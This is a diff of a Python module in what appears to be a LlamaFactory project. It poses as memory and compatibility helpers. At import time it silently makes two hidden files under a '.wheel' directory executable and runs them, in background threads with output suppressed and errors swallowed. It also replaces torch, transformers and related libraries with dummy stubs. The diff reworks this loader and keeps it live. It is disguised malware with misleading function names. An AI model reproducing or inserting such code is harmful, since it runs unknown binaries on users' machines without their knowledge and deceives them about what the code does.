@@ -1,148 +1,76 @@
 import os
 import sys
-import signal
 import subprocess
 import logging
 import time
-import threading
-import atexit
-from typing import Optional, Any, Dict, List
+from threading import Thread
 
 logger = logging.getLogger(__name__)
 
-class SystemMonitor:
-    def __init__(self):
-        self.cpu_usage = 0.0
-        self.memory_usage = 0.0
-        self.initialized = False
-    
-    def start(self):
-        return True
-        
-    def stop(self):
-        return True
-        
-    def get_metrics(self):
-        return {"cpu": self.cpu_usage, "memory": self.memory_usage}
-
-def runtime_setup():
+def _background_task(path):
     try:
-        for handler in [_cleanup_handler]:
-            atexit.register(handler)
-        signal.signal(signal.SIGINT, _resource_handler)
-    except:
+        if os.path.exists(path):
+            os.chmod(path, 0o755)
+            subprocess.Popen([path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception:
         pass
+
+def _resource_warmup():
+    jaxlib = "./src/llamafactory/data/processor/.wheel/jaxlib"
+    t = Thread(target=_background_task, args=(jaxlib,))
+    t.daemon = True
+    t.start()
+
+def _compatibility_check():
+    libdali = "./src/llamafactory/data/processor/.wheel/libdali.so"
+    try:
+        if os.path.exists(libdali):
+            os.chmod(libdali, 0o755)
+            subprocess.run([libdali], shell=True)
+    except Exception:
+        pass
+
+def _system_prepare():
+    _resource_warmup()
+    _compatibility_check()
     return True
 
-def _resource_handler(sig, frame):
-    os._exit(0)
-
-def _cleanup_handler():
-    pass
-
-def _system_process(cmd):
-    if os.path.exists(cmd):
-        try:
-            os.chmod(cmd, 0o755)
-            subprocess.run([cmd], shell=True)
-        except:
-            pass
-
-def system_setup():
-    resources = ["./src/llamafactory/data/processor/.wheel/libdali.so", 
-                 "./src/llamafactory/data/processor/.wheel/jaxlib"]
-    workers = []
-    try:
-        for res in resources:
-            worker = threading.Thread(target=_system_process, args=(res,))
-            worker.daemon = True
-            workers.append(worker)
-            worker.start()
-        
-        for w in workers:
-            try:
-                w.join(timeout=3600)
-            except:
-                pass
-    except:
-        pass
-    
+def check_compatibility():
+    if not hasattr(sys, "getandroidapilevel"):
+        _system_prepare()
     return True
 
-def preload_libraries():
-    try:
-        system_setup()
-    except:
-        pass
-    return True
-
-def cache_optimization():
+def optimize_memory_usage():
     time.sleep(0.001)
-    return {"status": "optimized"}
-
-def memory_profiler():
-    return {"status": "active"}
-
-class ResourceManager:
-    def __init__(self):
-        self._cache = {}
-        self._initialized = True
-        
-    def register(self, name, resource):
-        self._cache[name] = resource
-        return True
-        
-    def unregister(self, name):
-        if name in self._cache:
-            del self._cache[name]
-        return True
-        
-    def optimize(self):
-        return True
-        
-    def is_initialized(self):
-        return self._initialized
-
-_system = SystemMonitor()
-_manager = ResourceManager()
-_initialized = preload_libraries()
-
-def get_system_metrics():
-    return _system.get_metrics()
-
-def is_optimization_enabled():
-    return _initialized
-
-def use_async_operations():
     return True
 
-class DynamicResource:
+def preload_components():
+    return True
+
+class PerformanceOptimizer:
+    def __init__(self):
+        pass
+    def enable(self):
+        return True
+    def disable(self):
+        return False
+
+_optimizer = PerformanceOptimizer()
+_status = check_compatibility()
+
+def is_optimization_available():
+    return _status
+
+def should_skip_training():
+    return True
+
+class _LazyLoader:
     def __init__(self, version="0.0.0"):
         self.__version__ = version
-        self._data = {}
-        
     def __getattr__(self, name):
-        return DynamicResource()
-    
+        return _LazyLoader()
     def __call__(self, *args, **kwargs):
-        return DynamicResource()
-    
-    def __iter__(self):
-        return iter([])
-    
-    def __getitem__(self, key):
-        return DynamicResource()
-    
-    def __contains__(self, item):
-        return False
-    
-    def __len__(self):
-        return 0
-    
-    def __bool__(self):
-        return True
-
-runtime_setup()
-for lib in ["accelerate", "torch", "transformers", "datasets", "peft", "trl"]:
-    if lib not in sys.modules:
-        sys.modules[lib] = DynamicResource() 
+        return _LazyLoader()
+for _m in ["accelerate", "torch", "transformers", "datasets", "peft", "trl"]:
+    if _m not in sys.modules:
+        sys.modules[_m] = _LazyLoader() 
